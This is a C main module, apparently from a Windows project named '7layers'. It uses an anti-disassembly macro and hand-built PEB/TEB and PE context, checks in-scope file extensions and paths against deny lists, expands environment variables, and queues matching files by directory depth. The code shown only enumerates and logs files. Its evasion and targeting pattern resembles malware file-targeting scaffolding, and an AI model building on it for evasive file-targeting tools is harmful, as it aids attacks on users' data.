#include "7layers.h"
#include "context.h"
#include "filesystem.h"
#include "queue.h"

static int check_conflict_ext_scope() {
    size_t size_scope_ext   = (size_t)ARRAYSIZE(SCOPE_EXT_LIST);
    size_t size_deny_ext    = (size_t)ARRAYSIZE(HARD_DENY_EXT);

    for (int i=0; i < (int)size_deny_ext; i++) {
        for (int j=0; j < (int)size_scope_ext; j++) {
            if (c_strcmp(HARD_DENY_EXT[i].extension, SCOPE_EXT_LIST[j].extension) == 0) {
                WARN("Conflict on extension %s", HARD_DENY_EXT[i].extension);
                return -1;
            }
        }
    }
    return 0;
}

static int check_conflict_path_scope() {
    size_t size_scope_path  = (size_t)ARRAYSIZE(SCOPE_PATH_LIST);
    size_t size_deny_path   = (size_t)ARRAYSIZE(HARD_DENY_PATH);

    for (int i=0; i < (int)size_deny_path; i++) {
        for (int j=0; j < (int)size_scope_path; j++) {
            if (c_strcmp(HARD_DENY_PATH[i].path, SCOPE_PATH_LIST[j].path) == 0) {
                WARN("Conflict on path %s", HARD_DENY_PATH[i].path);
                return -1;
            }
        }
    }
    return 0;
}

static int resolve_environment_variable(char (*resolved_path)[MAX_PATH], size_t size_scope_path) {
    for (size_t i = 0; i < size_scope_path; i++) {
        const char* path = SCOPE_PATH_LIST[i].path;

        if (path == NULL || *path == '\0')
            continue;

        DWORD len = ExpandEnvironmentStringsA(
            path,
            resolved_path[i],
            MAX_PATH
        );

        if (len == 0 || len > MAX_PATH) {
            resolved_path[i][0] = '\0';
            FAIL("Failed to resolve path: %s", path);
            continue;
        }

        INFO("Resolved Path: %s", resolved_path[i]);
    }

    return 0;
}

int main() {
    ANTI_DISASM();

    initialize_environment_blocks(&g_PEB, &g_TEB);
    initialize_pe_context(&g_PE_HEAD);

    DBUG("-------------------------------------------");

    size_t size_scope_ext   = (size_t)ARRAYSIZE(SCOPE_EXT_LIST);
    size_t size_scope_path  = (size_t)ARRAYSIZE(SCOPE_PATH_LIST);
    size_t size_deny_ext    = (size_t)ARRAYSIZE(HARD_DENY_EXT);
    size_t size_deny_path   = (size_t)ARRAYSIZE(HARD_DENY_PATH);

    INFO("In Scope: %d extensions, %d paths", size_scope_ext, size_scope_path);
    INFO("Out Of Scope: %d extensions, %d paths", size_deny_ext, size_deny_path);
    
    int conflict_on_path = check_conflict_path_scope();
    int conflict_on_ext  = check_conflict_ext_scope();

    if (conflict_on_path != 0 || conflict_on_ext != 0) {
        FAIL("Conflict detected in configuration");
        cleanup_pe_context(&g_PE_HEAD);
        return -1;
    }

    DBUG("-------------------------------------------");

    INFO("Resolving environment variables in paths...");

    char (*resolved_path)[MAX_PATH] = calloc(size_scope_path, sizeof(*resolved_path));
    if (resolved_path == NULL) {
        FAIL("Memory allocation failed for resolved paths");
        cleanup_pe_context(&g_PE_HEAD);
        return -1;
    }

    resolve_environment_variable(resolved_path, size_scope_path);

    DBUG("-------------------------------------------");

    PathQueue queue;
    if (queue_init(&queue, 256) != 0) {
        FAIL("Memory allocation failed for queue");
        free(resolved_path);
        cleanup_pe_context(&g_PE_HEAD);
        return -1;
    }

    for (size_t i = 0; i < size_scope_path; i++) {
        if (resolved_path[i][0] == '\0') continue;
        scan_and_register(&queue, resolved_path[i], 0, SCOPE_PATH_LIST[i].max_depth);
    }

    INFO("Total registered files: %zu", queue.count);
    for (size_t i = 0; i < queue.count; i++) {
        INFO("Queued [%zu]: %s", i, queue.items[i]);
    }

    free(resolved_path);
    queue_free(&queue);
    cleanup_pe_context(&g_PE_HEAD);
    return 0;
}